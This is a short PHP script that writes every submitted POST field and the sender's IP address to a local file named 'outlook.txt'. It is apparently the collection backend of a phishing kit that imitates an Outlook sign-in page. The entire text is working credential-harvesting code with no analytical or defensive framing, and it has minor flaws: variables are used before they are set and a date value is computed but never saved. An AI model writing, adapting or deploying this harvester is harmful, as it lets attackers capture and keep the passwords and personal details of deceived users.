<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

	$date = new DateTime($dt, new DateTimeZone('America/Chicago'));
	foreach ($_POST as $key => $value) {
		$data2 = $data2 . $key . "=". $value . PHP_EOL;
	}

	$ip = "IP Address: ". $_SERVER['REMOTE_ADDR'] . PHP_EOL;
	$pdate = "Date: ".$date->format("F j, Y, g:i:s a"); 
	$log = "./outlook.txt";

	$data = $data2 . $ip. PHP_EOL. PHP_EOL;
	$fp = fopen($log, 'a');
	fwrite($fp, $data);
	fclose($fp);
	

}

?>
